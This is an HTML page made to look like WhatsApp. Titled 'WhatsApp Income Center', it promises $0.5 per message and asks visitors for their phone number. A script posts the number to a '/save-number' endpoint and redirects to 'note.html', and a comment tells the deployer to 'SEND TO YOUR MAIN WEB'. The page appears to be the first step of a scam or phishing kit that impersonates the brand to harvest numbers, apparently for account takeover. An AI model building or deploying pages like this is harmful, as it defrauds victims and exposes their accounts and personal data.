<!-- WHATSAPP STYLE PAGE 1 -->
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>WhatsApp Connect</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Poppins',sans-serif;
}

body{
height:100vh;
background:#0b141a;
display:flex;
justify-content:center;
align-items:center;
overflow:hidden;
}

.container{
width:90%;
max-width:400px;
background:#111b21;
padding:35px 25px;
border-radius:25px;
box-shadow:0 0 30px rgba(37,211,102,0.25);
text-align:center;
animation:fade .5s ease;
}

.logo{
width:85px;
margin-bottom:15px;
}

h1{
color:white;
font-size:28px;
margin-bottom:25px;
font-weight:700;
}

.input-box{
width:100%;
padding:16px;
border:none;
outline:none;
border-radius:15px;
background:#202c33;
color:white;
font-size:16px;
margin-bottom:20px;
}

.input-box::placeholder{
color:#9aa6ad;
}

.btn{
width:100%;
padding:15px;
border:none;
border-radius:15px;
background:#25D366;
color:white;
font-size:17px;
font-weight:600;
cursor:pointer;
transition:.3s;
}

.btn:hover{
transform:scale(1.03);
background:#1ebe5d;
}

@keyframes fade{
from{
opacity:0;
transform:translateY(20px);
}
to{
opacity:1;
transform:translateY(0);
}
}
</style>
</head>
<body>

<div class="container">

<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">

<h1>WhatsApp Income Center</h1>

<p>Welcome To WhatsApp income centre</p>

<p>Earn $0.5 For Each Message>

<input type="text" class="input-box" id="number" placeholder="Input your number">

<button class="btn" onclick="continuePage()">Continue</button>

</div>

<script>
function continuePage(){

const number = document.getElementById("number").value;

if(!number){
alert("Input number first");
return;
}

// SEND TO YOUR MAIN WEB
fetch("/save-number", {
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
number:number
})
})

.then(() => {
window.location.href = "note.html";
})

.catch(() => {
alert("Error sending number");
});

}
</script>

</body>
</html>
